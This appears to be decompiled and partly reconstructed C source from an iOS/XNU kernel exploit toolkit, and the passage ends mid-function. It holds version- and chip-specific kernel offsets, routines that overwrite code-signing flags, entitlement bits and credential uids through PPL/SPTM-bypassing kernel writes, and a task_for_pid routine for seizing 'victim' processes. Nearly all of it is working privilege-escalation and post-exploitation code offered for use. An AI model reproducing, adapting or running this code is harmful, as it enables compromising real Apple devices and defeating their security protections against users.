int __fastcall necp_send_msg_3(struct_krwCtx *krwCtx, unsigned int a2, int a3)
{
  int v6; // w8
  unsigned __int64 v7; // x0
  int v8; // w0
  __int64 v9; // x22
  int v10; // w8
  bool v11; // zf
  __int64 v12; // x8
  __int64 v13; // x9
  unsigned __int64 v14; // x0
  __int64 v15; // x21
  __int64 v16; // x22
  unsigned __int64 v17; // x0
  unsigned __int64 v18; // x22
  int v19; // w0
  int v20; // w0
  unsigned __int64 v21; // [xsp+8h] [xbp-38h] BYREF
  __int64 v22; // [xsp+10h] [xbp-30h] BYREF
  unsigned int v23; // [xsp+1Ch] [xbp-24h] BYREF

  v23 = 0;
  if ( !(unsigned int)validate_physmap_range_6(krwCtx, a2) )
    return 0;
  if ( !a3 )
  {
    if ( krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_PAC_KERNEL_LAYOUT) )
    {
      v7 = task_struct_field_kread(krwCtx, a2);
      if ( !v7 )
        return 0;
      if ( !kread_physmap_decorated(krwCtx, v7 + 176, (unsigned __int64 *)&v22) )
        return 0;
      if ( !validate_kaddr_range(krwCtx, v22) )
        return 0;
      if ( !kread_physmap_decorated(krwCtx, v22 + 80, &v21) )
        return 0;
      if ( v21 )
      {
        krwCtx->gap_0x128 = v21;
        v21 = 0;
        if ( !necp_kread_region(krwCtx, v22 + 80, (__int64)&v21, krwCtx->stride_0x168) )
          return 0;
      }
      goto LABEL_3;
    }
    if ( !krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A12_A13_A14_A15_A16_A17_MASK) )
      goto LABEL_3;
    v22 = 0;
    v10 = krwCtx->xnuMajorVersion;
    if ( v10 < 10002 )
    {
      if ( v10 < 8019 )
      {
        if ( v10 < 7195 )
        {
          if ( krwCtx->xnuVersionPacked <= XNU_VERSION_PACKED(6153, 40, 120, 1023, 1023) )
            v16 = 240;
          else
            v16 = 232;
LABEL_38:
          v17 = task_struct_field_kread(krwCtx, a2);
          if ( !v17 )
            return 0;
          v18 = v17 + v16;
          if ( !(unsigned int)krw_read_thunk(krwCtx, v18, 8, &v22) )
            return 0;
          if ( v22 )
          {
            v21 = 0;
            if ( (vm_page_mask & v22) != 0 )
              return 0;
            if ( !necp_kread_region(krwCtx, v18, (__int64)&v21, 8) )
              return 0;
            if ( !necp_kread_region(krwCtx, v18 + 8, (__int64)&v21, 8) )
              return 0;
          }
          goto LABEL_3;
        }
        v11 = !krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A14);
        v12 = 224;
        v13 = 216;
      }
      else
      {
        v11 = !krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A14_A15_A16_MASK);
        v12 = 160;
        v13 = 152;
      }
    }
    else
    {
      v11 = !krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A14_A15_A16_MASK);
      v12 = 168;
      v13 = 160;
    }
    if ( v11 )
      v16 = v13;
    else
      v16 = v12;
    goto LABEL_38;
  }
LABEL_3:
  v6 = krwCtx->xnuMajorVersion;
  if ( v6 <= 8019 )
  {
    v9 = 268;
    if ( v6 != 6153 && v6 != 7195 )
    {
      if ( v6 != 8019 )
        return 0;
      v9 = 284;
    }
    goto LABEL_28;
  }
  if ( v6 > 8795 )
  {
    if ( v6 != 8796 )
    {
      if ( v6 != 10002 )
        return 0;
      v9 = 200;
      goto LABEL_28;
    }
    goto LABEL_23;
  }
  if ( v6 != 8020 )
  {
    if ( v6 != 8792 )
      return 0;
LABEL_23:
    v9 = 180;
    goto LABEL_28;
  }
  v9 = 148;
LABEL_28:
  v14 = find_kernel_struct_addr(krwCtx, a2);
  if ( v14 )
  {
    v15 = v14 + v9;
    if ( (unsigned int)krw_read_thunk(krwCtx, v14 + v9, 4, &v23) )
    {
      v23 = (v23 & 0xFFFFFBFF) | ((a3 != 0) << 10);
      return kwrite_with_retry(krwCtx, v15, (__int64)&v23, 4);
    }
  }
  return 0;
}
// 3AB20: variable 'v8' is possibly undefined
// 3AD0C: variable 'v19' is possibly undefined
// 3AD24: variable 'v20' is possibly undefined

//----- (000000000003AD2C) ----------------------------------------------------
__int64 __fastcall get_task_port_pid_field_offset(struct_krwCtx *krwCtx, unsigned int a2)
{
  unsigned __int64 v3; // x0
  __int64 v4; // x8
  int xnuMajorVersion; // w9
  __int64 v6; // x8
  mach_vm_address_t v7; // x20
  unsigned int v8; // w8
  unsigned int v10; // w9
  unsigned int v11; // [xsp+Ch] [xbp-14h] BYREF

  v3 = kread_task_struct(krwCtx, a2);
  if ( !v3 )
    return 0;
  v4 = 0;
  xnuMajorVersion = krwCtx->xnuMajorVersion;
  if ( xnuMajorVersion <= 8019 )
  {
    switch ( xnuMajorVersion )
    {
      case 6153:
        v6 = 960;
        break;
      case 7195:
        v6 = 936;
        break;
      case 8019:
        v6 = 1072;
        if ( krwCtx->xnuVersionPacked > XNU_VERSION_PACKED(8019, 60, 39, 1023, 1023) )
          v6 = 1232;
        break;
      default:
        return v4;
    }
    goto LABEL_19;
  }
  if ( xnuMajorVersion > 8795 )
  {
    if ( xnuMajorVersion != 8796 && xnuMajorVersion != 10002 )
      return v4;
    v6 = 1700;
LABEL_19:
    v7 = v6 + v3;
    if ( kread_u32(krwCtx, v6 + v3, &v11) )
    {
      v8 = v11;
      if ( !HIBYTE(v11) )
      {
        v10 = krwCtx->xnuVersionPacked <= XNU_VERSION_PACKED(8018, 1023, 1023, 1023, 1023) ? v11 | 0x20 : (v11 & 0xFFF71FDF) | 0x80000;
        v11 = v10 & 0xFFFF1FFF;
        if ( v8 == (v10 & 0xFFFF1FFF) || noppl_kwrite32(krwCtx, v7, v10 & 0xFFFF1FFF) )
          return 1;
      }
    }
    return 0;
  }
  if ( xnuMajorVersion == 8020 )
  {
    v6 = 1224;
    goto LABEL_19;
  }
  if ( xnuMajorVersion == 8792 )
  {
    v6 = 1196;
    goto LABEL_19;
  }
  return v4;
}

//----- (000000000003AE94) ----------------------------------------------------
bool __fastcall kread_proc_kobj_entitlement_full(struct_krwCtx *krwCtx, unsigned int a2, int a3, int a4, int a5)
{
  unsigned __int64 v10; // x0
  unsigned __int64 v11; // x22
  __int64 v12; // x23
  __int64 v13; // x0
  __int64 v14; // x24
  unsigned __int64 v15; // x0
  __int64 v16; // x23
  unsigned __int64 v17; // x0
  __int64 v18; // x0
  __int64 v19; // x23
  int v20; // w8
  struct_krwCtx *v21; // x0
  int v22; // w1
  bool v23; // zf
  __int64 v24; // x8
  __int64 v25; // x9
  int v26; // w8
  __int64 v27; // x8
  unsigned __int64 v28; // x22
  unsigned __int64 v29; // x8
  bool v30; // cc
  int v31; // w8
  int v32; // w11
  int v33; // w10
  int v34; // w8
  int v35; // w0
  unsigned __int64 v36; // x26
  unsigned __int64 v37; // x8
  __int64 v38; // x23
  unsigned __int64 v39; // x28
  bool v40; // zf
  unsigned __int64 v41; // x27
  __int64 v42; // x24
  __int64 v43; // x20
  struct_a1 *v44; // x0
  __int128 v45; // q1
  __int64 v46; // [xsp+8h] [xbp-98h]
  __int64 v47; // [xsp+10h] [xbp-90h] BYREF
  unsigned __int8 v48; // [xsp+1Eh] [xbp-82h] BYREF
  char v49; // [xsp+1Fh] [xbp-81h] BYREF
  __int64 v50; // [xsp+20h] [xbp-80h] BYREF
  unsigned __int64 v51[3]; // [xsp+28h] [xbp-78h] BYREF
  char newBytes; // [xsp+43h] [xbp-5Dh] BYREF
  int v53; // [xsp+44h] [xbp-5Ch] BYREF
  __int64 v54; // [xsp+48h] [xbp-58h] BYREF

  v50 = 0;
  v10 = task_struct_field_kread(krwCtx, a2);
  if ( !v10 )
    return 0;
  v11 = v10;
  if ( !krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_PAC_KERNEL_LAYOUT) )
  {
    if ( !krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A12_A13_A14_A15_A16_A17_MASK) )
    {
      if ( !krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A11) )
        return 0;
      v26 = krwCtx->xnuMajorVersion;
      if ( v26 <= 8791 )
      {
        if ( v26 <= 8018 )
        {
          if ( v26 <= 7194 )
          {
            if ( v26 < 6153 )
              return 0;
            v27 = 239;
            if ( krwCtx->xnuVersionPacked > XNU_VERSION_PACKED(6153, 40, 120, 1023, 1023) )
              v27 = 231;
          }
          else
          {
            v27 = 223;
          }
        }
        else
        {
          v27 = 151;
        }
      }
      else
      {
        v27 = 143;
      }
      v43 = v27 + v11;
      if ( (unsigned int)krw_read_thunk(krwCtx, v27 + v11, 1, (char *)&v50 + 4) )
      {
        LODWORD(v50) = a5;
        if ( HIDWORD(v50) != a5 )
          kwrite_with_retry(krwCtx, v43, (__int64)&v50, 1);
      }
      return 0;
    }
    v20 = krwCtx->xnuMajorVersion;
    if ( v20 >= 10002 )
    {
      v21 = krwCtx;
      v22 = 18350080;
LABEL_26:
      v23 = !krw_ctx_has_flag(v21, v22);
      v24 = 199;
      v25 = 191;
      goto LABEL_32;
    }
    if ( v20 < 8792 )
    {
      if ( v20 >= 8019 )
      {
        v21 = krwCtx;
        v22 = 1572864;
        goto LABEL_26;
      }
      if ( v20 < 7195 )
      {
        v24 = 271;
        if ( krwCtx->xnuVersionPacked > XNU_VERSION_PACKED(6153, 40, 120, 1023, 1023) )
          v24 = 263;
LABEL_34:
        v28 = v24 + v11;
        if ( (unsigned int)krw_read_thunk(krwCtx, v28, 4, (char *)&v50 + 4) )
        {
          v29 = krwCtx->xnuVersionPacked;
          v30 = v29 > XNU_VERSION_PACKED(7195, 42, 0, 1023, 1023);
          if ( v29 <= XNU_VERSION_PACKED(7195, 42, 0, 1023, 1023) )
            v31 = -16777216;
          else
            v31 = 65280;
          if ( v30 )
            v32 = 0x1000000;
          else
            v32 = 0x10000;
          if ( v30 )
            v33 = 0x10000;
          else
            v33 = 256;
          v34 = HIDWORD(v50) & v31;
          if ( !a4 )
            v32 = 0;
          if ( !a3 )
            v33 = 0;
          LODWORD(v50) = v32 | v33 | a5 | v34;
          if ( HIDWORD(v50) == (uint32_t)v50 || necp_kread_region(krwCtx, v28, (__int64)&v50, 4) )
          {
            if ( krwCtx->xnuMajorVersion <= 8018 )
              a4 |= a3 ^ 1;
            if ( krwCtx->xnuVersionPacked > XNU_VERSION_PACKED(8018, 1023, 1023, 1023, 1023) || csblob_modify_entitlement_bits(krwCtx, a2, a4, a5) )
              goto LABEL_54;
          }
        }
        return 0;
      }
      v23 = !krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A14);
      v24 = 263;
      v25 = 255;
    }
    else
    {
      v23 = !krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A14_A15_A16_MASK);
      v24 = 191;
      v25 = 183;
    }
LABEL_32:
    if ( v23 )
      v24 = v25;
    goto LABEL_34;
  }
  if ( !(unsigned int)krw_read_thunk(krwCtx, v11 + 146, 1, &v48) )
    return 0;
  if ( v48 == a5 )
    goto LABEL_17;
  v49 = a5;
  if ( !(unsigned int)kwrite_with_retry(krwCtx, v11 + 146, (__int64)&v49, 1) )
    return 0;
  if ( !a5 )
  {
LABEL_17:
    if ( !kread_physmap_decorated(krwCtx, v11 + 176, v51) )
      return 0;
    if ( !validate_kaddr_range(krwCtx, v51[0]) )
      return 0;
    if ( !(unsigned int)krw_read_thunk(krwCtx, v51[0] + 32, 1, &v54) )
      return 0;
    v49 = a4;
    if ( (unsigned __int8)v54 != a4 && !(unsigned int)ppl_kwritebuf(krwCtx, v51[0] + 32, &v49, 1) )
      return 0;
LABEL_54:
    if ( dyldVersionNumber >= 851.0 )
      set_proc_flag_bit7_kwrite(krwCtx, a2, a4);
    return 1;
  }
  if ( !kread_physmap_decorated(krwCtx, v11 + krwCtx->stride_0x168, (unsigned __int64 *)&v47) )
    return 0;
  v46 = v47;
  v12 = krwCtx->kextMachoCtx1;
  if ( v12 )
  {
LABEL_9:
    macho_find_text_section(v12, v51);
    v13 = kernel_pattern_scan((__int64)v51, "68 02 08 CB 1F 20 03 D5", 0);
    if ( v13 )
    {
      v14 = v13;
      v15 = find_kernel_func(krwCtx->kextMachoCtx1, (__int64 *)(v13 - 8));
      if ( v15 )
      {
        v16 = macho_read_u64_thunk(krwCtx->kextMachoCtx1, v15);
        if ( validate_kaddr_range(krwCtx, v16) )
        {
          v17 = find_kernel_func(krwCtx->kextMachoCtx1, (__int64 *)(v14 + 4));
          if ( v17 )
          {
              v18 = macho_read_u64_thunk(krwCtx->kextMachoCtx1, v17);
            if ( v18 )
            {
              v19 = v16 + (((unsigned __int64)(v46 - v18) >> 10) & 0x3FFFFFFFFFFFF0LL) + 9;
              if ( (unsigned int)krw_read_thunk(krwCtx, v19, 1, &newBytes) )
              {
                if ( (newBytes & 1) != 0 )
                  goto LABEL_17;
                newBytes |= 1u;
                if ( (unsigned int)ppl_kwritebuf(krwCtx, v19, &newBytes, 1) )
                  goto LABEL_17;
              }
            }
          }
        }
      }
    }
  }
  else
  {
    map_physpage_to_user(krwCtx, 0, 0, 0);
    if ( krwCtx->iogpuObjCount )
    {
      v36 = 0;
      do
      {
        uint64_t *physmap_entry = &krwCtx->raw_0x1A08[3 * v36];
        v38 = physmap_entry[1];
        v39 = physmap_entry[2];
        if ( validate_kaddr_range(krwCtx, v38) )
          v40 = v39 == 0;
        else
          v40 = 1;
        if ( !v40 )
        {
          if ( !(unsigned int)krw_read_thunk(krwCtx, v38 + 8, 8, &v54) )
            return 0;
          if ( v54 == 0x6F74616C75676572LL )
          {
            v41 = 0;
            do
            {
              v42 = v41 + v38;
              if ( !kread_u32(krwCtx, v41 + v38, &v53) )
                break;
              if ( v53 == -17958193 )
              {
                if ( v42 )
                {
                  v44 = (struct_a1 *)calloc(0x128u, 1u);
                  if ( v44 )
                  {
                    v12 = (__int64)v44;
                    krw_ctx_zero_fields(v44, krwCtx);
                    v45 = *(__int128 *)&krwCtx->gap_0x150;
                    *(__int128 *)(v12 + 112) = *(__int128 *)&krwCtx->xnuMajorVersion;
                    *(__int128 *)(v12 + 128) = v45;
                    *(uint64_t *)(v12 + 144) = krwCtx->gap_0x160_size8;
                    *(uint32_t *)(v12 + 152) = krwCtx->vmMapSize_size4;
                    *(uint32_t *)(v12 + 56) = krwCtx->pageSizeOrSomething;
                    if ( iosurface_physmap_setup_bool(v12, 0, v42, 0) )
                    {
                      krwCtx->kextMachoCtx1 = v12;
                      goto LABEL_9;
                    }
                  }
                }
                return 0;
              }
              v41 += krwCtx->pageSizeOrSomething;
            }
            while ( v41 < v39 );
          }
        }
        ++v36;
      }
      while ( v36 < krwCtx->iogpuObjCount );
    }
  }
  return 0;
}
// 3B1C4: variable 'v35' is possibly undefined
// 19B94: using guessed type __int64 __fastcall macho_read_u64_thunk(uint64_t, uint64_t);

//----- (000000000003B49C) ----------------------------------------------------
mach_vm_address_t __fastcall set_proc_flag_bit7_kwrite(struct_krwCtx *krwCtx, unsigned int a2, int a3)
{
  mach_vm_address_t result; // x0
  mach_vm_address_t v6; // x20
  unsigned int v7; // w9
  int v8; // w10
  int v9; // [xsp+Ch] [xbp-24h] BYREF

  result = get_task_csflags_kaddr(krwCtx, a2);
  if ( result )
  {
    v6 = result;
    result = kread_u32(krwCtx, result, &v9);
    if ( (uint32_t)result )
    {
      v7 = v9 & 0xFFFFFF7F;
      if ( a3 )
        v8 = 128;
      else
        v8 = 0;
      if ( (v7 | v8) == v9 )
        return 1;
      result = ppl_kwrite32(krwCtx, v6, v7 | v8);
      if ( (uint32_t)result )
        return 1;
    }
  }
  return result;
}

//----- (000000000003B524) ----------------------------------------------------
unsigned __int64 __fastcall get_proc_kobj_exec_flags(struct_krwCtx *krwCtx, unsigned int a2, bool *a3, bool *a4, bool *a5)
{
  unsigned __int64 v9; // x23
  int v10; // w8
  struct_krwCtx *v11; // x0
  int v12; // w1
  bool v13; // zf
  __int64 v14; // x8
  __int64 v15; // x9
  int v16; // w8
  __int64 v17; // x8
  unsigned __int64 v18; // x9
  unsigned int v19; // w8
  bool v20; // zf
  char v21; // w8
  char v23; // [xsp+Fh] [xbp-41h] BYREF
  __int64 v24; // [xsp+10h] [xbp-40h] BYREF
  unsigned int v25; // [xsp+1Ch] [xbp-34h] BYREF

  v25 = 0;
  v9 = task_struct_field_kread(krwCtx, a2);
  if ( v9 )
  {
    if ( krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_PAC_KERNEL_LAYOUT) )
    {
      if ( kread_physmap_decorated(krwCtx, v9 + 176, (unsigned __int64 *)&v24) )
      {
        if ( validate_kaddr_range(krwCtx, v24) )
        {
          v9 = 1;
          if ( (unsigned int)krw_read_thunk(krwCtx, v24 + 32, 1, &v23) )
          {
            *a4 = v23 != 0;
            *a5 = 0;
            *a3 = 1;
            return v9;
          }
        }
      }
      return 0;
    }
    if ( !krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A12_A13_A14_A15_A16_A17_MASK) )
    {
      if ( !krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A11) )
        return 0;
      v16 = krwCtx->xnuMajorVersion;
      if ( v16 <= 8791 )
      {
        if ( v16 <= 8018 )
        {
          if ( v16 <= 7194 )
          {
            if ( v16 < 6153 )
              return 0;
            v17 = 239;
            if ( krwCtx->xnuVersionPacked > XNU_VERSION_PACKED(6153, 40, 120, 1023, 1023) )
              v17 = 231;
          }
          else
          {
            v17 = 223;
          }
        }
        else
        {
          v17 = 151;
        }
      }
      else
      {
        v17 = 143;
      }
      if ( !(unsigned int)krw_read_thunk(krwCtx, v17 + v9, 1, &v25) )
        return 0;
      *a5 = (uint8_t)v25 != 0;
      *a4 = 0;
      *a3 = 0;
      return 1;
    }
    v10 = krwCtx->xnuMajorVersion;
    if ( v10 >= 10002 )
    {
      v11 = krwCtx;
      v12 = 18350080;
LABEL_10:
      v13 = !krw_ctx_has_flag(v11, v12);
      v14 = 199;
      v15 = 191;
      goto LABEL_16;
    }
    if ( v10 < 8792 )
    {
      if ( v10 >= 8019 )
      {
        v11 = krwCtx;
        v12 = 1572864;
        goto LABEL_10;
      }
      if ( v10 < 7195 )
      {
        v14 = 271;
        if ( krwCtx->xnuVersionPacked > XNU_VERSION_PACKED(6153, 40, 120, 1023, 1023) )
          v14 = 263;
        goto LABEL_18;
      }
      v13 = !krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A14);
      v14 = 263;
      v15 = 255;
    }
    else
    {
      v13 = !krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_CPU_A14_A15_A16_MASK);
      v14 = 191;
      v15 = 183;
    }
LABEL_16:
    if ( v13 )
      v14 = v15;
LABEL_18:
    if ( !kread_u32(krwCtx, v14 + v9, &v25) )
      return 0;
    v18 = krwCtx->xnuVersionPacked;
    v19 = v25;
    *a5 = (unsigned __int8)v25 != 0;
    if ( v18 < XNU_VERSION_PACKED(7195, 42, 1, 0, 0) )
    {
      *a3 = (v19 & 0xFF00) != 0;
      v20 = (v19 & 0xFF0000) == 0;
    }
    else
    {
      *a3 = (v19 & 0xFF0000) != 0;
      v20 = HIBYTE(v19) == 0;
    }
    v21 = !v20;
    *a4 = v21;
    return 1;
  }
  return v9;
}

//----- (000000000003B7E0) ----------------------------------------------------
int set_task_special_port_and_patch_uid(struct_krwCtx *krwCtx, task_inspect_t task, mach_port_t a3)
{
    // FIXME: quite buggy and prone to panic, gotta ASAN later. However all we need is krw with PPL/SPTM bypass so just skip it
    if(1)return 1;
    
    // Check if task already has the right special port
    mach_port_t special_port = 0;
    kern_return_t kr = task_get_special_port(task, 2, &special_port);
    if (kr != KERN_SUCCESS)
        return 0;
    if (special_port == a3)
        return 1;   // already set, nothing to do

    // Check flag: 0x5584001
    if (krwCtx->flags & 0x5584001) {

        // New path: version > 8018
        uint64_t ver_threshold_old = XNU_VERSION_PACKED(8018, 1023, 1023, 1023, 1023);
        if (krwCtx->xnuVersionPacked > ver_threshold_old) {

            // Must be operating on self task
            if (mach_task_self_ != task)
                return 0;

            // Get security token (flavor 0xD)
            uint32_t cnt = 2;
            integer_t task_info_out[2] = {0};
            if (task_info(task, 0xD, task_info_out, &cnt))
                return 0;

            // Get audit token (flavor 0xF)
            cnt = 8;
            audit_token_t audit_token = {0};
            if (task_info(task, 0xF, (task_info_t)&audit_token, &cnt))
                return 0;

            // Get kernel address of task port
            uint64_t task_kaddr = get_task_kobj_and_walk_chain(krwCtx, task);
            if (!task_kaddr)
                return 0;

            // Read pointer from task_kaddr
            uint64_t kptr = 0;
            if (!kread64_internal(krwCtx, task_kaddr, &kptr))
                return 0;

            // Translate/canonicalize
            uint64_t obj = maybe_sptm_translate_kaddr(krwCtx, kptr);
            if (!validate_kaddr_range(krwCtx, obj))
                return 0;

            // Read credential field at obj+0x18
            uint64_t cred_addr = obj + 0x18;  // x22
            int32_t  cur_uid   = 0;            // [xbp-0x54]
            if (!kread_u32(krwCtx, cred_addr, &cur_uid))
                return 0;

            // Second version threshold: 0x001F530F027FFFFF
            uint64_t ver_threshold_new = XNU_VERSION_PACKED(8019, 60, 39, 1023, 1023);  // x25

            int32_t  cur_uid2 = 0;  // [xbp-0x58]
            if (krwCtx->xnuVersionPacked > ver_threshold_new) {
                if (!kread_u32(krwCtx, obj + 0x20, &cur_uid2))
                    return 0;
            }

            // Determine which port slot we're targeting and compute new uid
            int32_t  new_uid;  // x24 / w24
            int32_t  write_val2; // w2, used for ppl_kwrite32 of cred_addr
            bool     need_v13;   // w27

            if (krwCtx->hostPrivPort == a3) {
                // Self task port slot
                new_uid    = 0;
                bool is_new_ver = krwCtx->xnuVersionPacked > ver_threshold_new;
                bool uid_is_zero = (cur_uid == 0);
                need_v13   = is_new_ver && uid_is_zero;  // ands w27, w10, w11
                write_val2 = need_v13 ? 501 : 0;         // csel w2, #501, wzr
            } else {
                if (krwCtx->hostSelfPort != a3)
                    return 0;
                // Other port slot
                new_uid    = cur_uid;    // mov x24, x9
                write_val2 = 0;
                bool is_new_ver = krwCtx->xnuVersionPacked > ver_threshold_new;
                bool uid_nonzero = (cur_uid != 0);
                need_v13   = is_new_ver && uid_nonzero;
            }

            // Write new uid if changed or need_v13
            // cmp w9, w24; b.ne +776 / tbz w27,#0, +848
            if (cur_uid != new_uid || need_v13) {
                if (krwCtx->xnuVersionPacked > ver_threshold_new) {
                    if (need_v13) {
                        // ppl_kwrite32(krwCtx, cred_addr, write_val2)
                        if (!ppl_kwrite32(krwCtx, cred_addr, write_val2))
                            return 0;
                    }
                    // ppl_kwrite32(krwCtx, obj+0x20, new_uid)
                    if (!ppl_kwrite32(krwCtx, obj + 0x20, new_uid))
                        return 0;  // cbnz → return 0, else fall through
                } else {
                    // noppl_kwrite32(krwCtx, cred_addr, new_uid)
                    if (!noppl_kwrite32(krwCtx, cred_addr, new_uid))
                        return 0;
                }
            }

            // necp_set_opt_string_6(krwCtx, mach_task_self_)
            // ldr w1, [x26]  →  x26 = &mach_task_self_, so w1 = mach_task_self_
            if (!necp_set_opt_string_6(krwCtx, mach_task_self_))
                return 0;

            // Version check again
            if (krwCtx->xnuVersionPacked > ver_threshold_new && vm_attr_increment_offset_check(krwCtx, obj)) {
                return 0;  // cbnz → return 0
            }

            // validate_kaddr_range(krwCtx, krwCtx->gap_0x398)
            if (validate_kaddr_range(krwCtx, krwCtx->gap_0x398)) {
                // necp_set_opt_string_7(krwCtx, krwCtx->gap_0x37C_size4, 0)
                if (!necp_set_opt_string_7(krwCtx,
                               krwCtx->gap_0x37C_size4,
                               0))
                    return 0;
            }

            // seteuid(new_uid)
            if (seteuid(new_uid))
                return 0;

            if (krwCtx->xnuVersionPacked > ver_threshold_new) {
                // Re-read task_kaddr to verify it hasn't changed
                uint64_t kptr2 = 0;
                if (!kread64_internal(krwCtx, task_kaddr, &kptr2))
                    return 0;

                uint64_t saved_kptr = krwCtx->iosurfaceObj;
                // [sp+0x10] was the first kptr read
                if (kptr2 != saved_kptr) {
                    if (!kwrite64_dispatch(krwCtx, task_kaddr, saved_kptr))
                        return 0;
                }
            }

            // validate_kaddr_range(krwCtx, krwCtx->gap_0x398) again
            if (validate_kaddr_range(krwCtx, krwCtx->gap_0x398)) {
                // necp_set_opt_string_7(krwCtx, krwCtx->gap_0x37C_size4, krwCtx->gap_0x3A8)
                if (!necp_set_opt_string_7(krwCtx,
                               krwCtx->gap_0x37C_size4,
                               krwCtx->gap_0x3A8))
                    return 0;
            }

            // Restore uid if changed
            // ldur w2,[xbp-0x54] = cur_uid; cmp w2,w24 (new_uid)
            // orr w8,cset_ne,w27
            if (cur_uid != new_uid || need_v13) {
                if (krwCtx->xnuVersionPacked > ver_threshold_new) {
                    if (need_v13) {
                        if (!ppl_kwrite32(krwCtx, cred_addr, cur_uid))
                            return 0;
                    }
                    // ppl_kwrite32(krwCtx, obj+0x20, cur_uid2)
                    if (ppl_kwrite32(krwCtx, obj + 0x20, cur_uid2))
                        return 0;  // cbnz → return 0
                } else {
                    if (!noppl_kwrite32(krwCtx, cred_addr, cur_uid))
                        return 0;
                }
            }

            // check_task_dyld_info_versioned(krwCtx, task, 1, task_info_out, 8)
            if (check_task_dyld_info_versioned(krwCtx, task, 1, task_info_out, 8)) {
                // check_task_dyld_info_versioned(krwCtx, task, 3, &audit_token, 32)
                check_task_dyld_info_versioned(krwCtx, task, 3, &audit_token, 32);
            }

            return 0;

        } else {
            // Old path: version <= 8018
            // Use host_security_set_task_token

            host_security_t host_sec = krwCtx->hostSecurityPort;

            uint32_t cnt = 2;
            integer_t task_info_out[2] = {0};
            if (task_info(task, 0xD, task_info_out, &cnt))
                return 0;

            cnt = 8;
            audit_token_t audit_token = {0};
            if (task_info(task, 0xF, (task_info_t)&audit_token, &cnt)) {
                return 0;
            }

            security_token_t sec_token = *(security_token_t *)task_info_out;
            // Copy audit_token to local (ldp q0,q1 / stp q0,q1)
            audit_token_t audit_copy = audit_token;

            kern_return_t r = host_security_set_task_token(
                host_sec, task, sec_token, audit_copy, a3);

            return (r == KERN_SUCCESS) ? 1 : 0;
        }

    } else {
        // Flag not set — use port kaddr write path

        uint32_t offset = get_task_pid_offset(krwCtx);  // field offset
        if (!offset)
            return 0;

        uint64_t task_kaddr = get_task_kobject_addr(krwCtx, task);
        if (!task_kaddr)
            return 0;

        uint64_t target_addr = task_kaddr + offset;  // add x20,x0,w21 uxtw

        uint64_t cur_val = 0;
        if (!kread64(krwCtx, target_addr, &cur_val))
            return 0;

        if (!validate_kaddr_range(krwCtx, cur_val))
            return 0;

        // Determine new value to write
        // cmn w24, #1 → checks a3 == -1 (MACH_PORT_NULL-ish)
        // csetm x21, eq → x21 = (a3==-1) ? -1 : 0
        uint64_t new_val;
        if ((uint32_t)(a3 + 1) < 2) {
            // a3 is 0 or -1
            new_val = (a3 == (mach_port_t)-1) ? (uint64_t)-1 : 0;
        } else {
            uint64_t ipc_port = task_self_get_ipc_port(krwCtx, a3);
            if (!ipc_port)
                return 0;
            if (kread_and_vm_attr_double(krwCtx, ipc_port))
                return 0;
            new_val = ipc_port;
        }

        // kwrite64, return 1 on failure, 0 on success
        int wr = kwrite64(krwCtx, target_addr, new_val);
        return (wr != 0) ? 1 : 0;
    }
}
// 3BB7C: variable 'v22' is possibly undefined
// 3BBC8: variable 'v23' is possibly undefined
// 3BBEC: variable 'v24' is possibly undefined

//----- (000000000003BC88) ----------------------------------------------------
bool __fastcall real_task_for_pid(struct_krwCtx *krwCtx, int a2, mach_port_name_t *a3)
{
  return krw_task_for_pid_or_name_ret_ptr(krwCtx, a2, 0, a3);
}

//----- (000000000003BC94) ----------------------------------------------------
bool __fastcall real_task_for_pid_or_name(
                                          struct_krwCtx *krwCtx,
        int victim_pid,
        const char *victim_process_name,
        mach_port_name_t *out_task)
{
  mach_port_t v8; // w20
  kern_return_t v9; // w0
  __int64 v10; // x8
  unsigned int v11; // w1
  unsigned __int64 v12; // x0
  __int64 v13; // x0
  int v14; // w9
  unsigned __int64 v15; // x10
  __int64 v16; // x11
  __int64 v17; // x10
  unsigned __int64 v19; // [xsp+8h] [xbp-28h] BYREF

  if ( victim_pid < 1 || getpid() != victim_pid )
  {
    v11 = krwCtx->parentTaskPort;
    if ( !v11 )
      v11 = krwCtx->targetVmPort;
    v12 = get_task_kobject_addr(krwCtx, v11);
    if ( !v12 )
      return 0;
    if ( victim_process_name )
    {
      v13 = krw_task_for_name(krwCtx, v12, victim_process_name);
      if ( !v13 )
        return 0;
    }
    else
    {
      v13 = krw_task_for_pid_0(krwCtx, v12, victim_pid);
      if ( !v13 )
        return 0;
    }
    v10 = 0;
    v14 = krwCtx->xnuMajorVersion;
    if ( v14 > 8791 )
    {
      v17 = 200;
      if ( v14 != 8792 && v14 != 8796 && v14 != 10002 )
        return v10;
    }
    else
    {
      if ( (unsigned int)(v14 - 8019) < 2 )
      {
        v15 = XNU_VERSION_PACKED(8019, 60, 39, 1023, 1023);
        v16 = 208;
      }
      else
      {
        v15 = XNU_VERSION_PACKED(7195, 100, 325, 1023, 1023);
        v16 = 240;
        if ( v14 != 6153 && v14 != 7195 )
          return v10;
      }
      if ( krwCtx->xnuVersionPacked <= v15 )
        v17 = 248;
      else
        v17 = v16;
    }
    if ( kread_physmap_decorated(krwCtx, v17 + v13, &v19) && validate_kaddr_range(krwCtx, v19) )
      return (unsigned int)plist_elem_is_string_6(krwCtx, v19, out_task) == 0;
    return 0;
  }
  v8 = mach_task_self_;
  v9 = mach_port_mod_refs(mach_task_self_, mach_task_self_, 0, 1);
  v10 = 0;
  if ( !v9 )
  {
    *out_task = v8;
    return 1;
  }
  return v10;
}

//----- (000000000003BE3C) ----------------------------------------------------
bool __fastcall set_thread_state_versioned(
        struct_krwCtx *krwCtx,
        int a2,
        thread_act_t a3,
        thread_state_flavor_t a4,
        natural_t *a5,
